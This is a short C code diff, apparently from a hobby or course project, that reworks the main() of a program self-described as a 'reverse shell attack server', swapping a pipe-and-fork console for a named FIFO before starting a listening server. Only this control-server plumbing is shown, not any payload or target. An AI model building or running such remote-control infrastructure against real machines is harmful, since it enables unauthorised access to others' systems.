@@ -22,7 +22,7 @@
 #include "networking.h"
 #include "control_server.h"
 #include "user_console.h"
-
+#include <fcntl.h>
 #define SIZE 100
 
 void sighandler(int signo){
@@ -60,29 +60,18 @@ int recv_user_cmd(){
   printf("RECV: %d, %s\n", shellid, cmd);
 }
 
+
 int main(int argc, char const* argv[]){
     signal(SIGCHLD, sighandler); //set SIGCHILD to reaper...
     signal(SIGUSR1, sighandler);
 
-    int user_fds[2];
-    pipe(user_fds);
+    mkfifo(FIFO_NAME, 0777);
+    
 
-    int user_write = user_fds[1];
+    printf("welcome to the reverse shell attack server!\n");
+    printf("PID: %d\n", getpid());
+    user_read = open(FIFO_NAME, O_RDONLY, 0);
 
-    user_read = user_fds[0];
-
-    int chldid = fork();
-    if(chldid==0){
-      close(user_read);
-      user_console(user_write);
-    }
-    close(user_write);
-
-
-
-    // while(1){
-    //   recv_user_cmd();
-    // }
     //set up server listening ...
     int server_fd = setup_server();
 
